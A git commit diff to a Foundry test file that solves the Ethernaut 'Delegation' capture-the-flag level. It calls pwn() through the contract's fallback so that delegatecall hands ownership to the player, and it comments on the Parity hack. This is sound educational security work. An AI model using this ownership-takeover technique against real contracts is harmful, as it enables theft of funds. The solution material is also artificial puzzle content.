44846f020ad9906553371ab8338cbd79b270ba04
Kristjan Kosic <kristjan@protokol.com>
2022-08-30 18:25:56 +0000

    test: solved delegation / Parity hack

--- test/Delegation.t.sol
+++ test/Delegation.t.sol
@@ -37,8 +37,19 @@ contract TestDelegation is BaseTest {
         vm.startPrank(player, player);
 
         /** CODE YOUR EXPLOIT HERE */
+        // https://ethernaut.openzeppelin.com/level/0x9451961b7Aea1Df57bc20CC68D72f662241b5493
+        // run with `$> forge test -vv --match-contract Delegation`
 
-        (bool success, ) = address(level).call(abi.encodeWithSignature("pwn()"));
+        // a great explanation for this little amount of code can be also found here:
+        // https://medium.com/coinmonks/ethernaut-lvl-6-walkthrough-how-to-abuse-the-delicate-delegatecall-466b26c429e4
+        // actually PARITY HACK $30 had this issues
+        // also important to understand the use of fallback(https://blog.soliditylang.org/2020/03/26/fallback-receive-split/)
+        // and storage slots
+
+        //(bool success, ) = address(level).call(abi.encodeWithSignature("pwn()"));
+        // or
+        (bool success, ) = address(level).call(abi.encodeWithSelector(bytes4(keccak256("pwn()"))));
+        emit log_named_bytes32("Encoded Selector", bytes32(keccak256("pwn()")));
         require(success, "call not successful");
 
         assertEq(level.owner(), player);
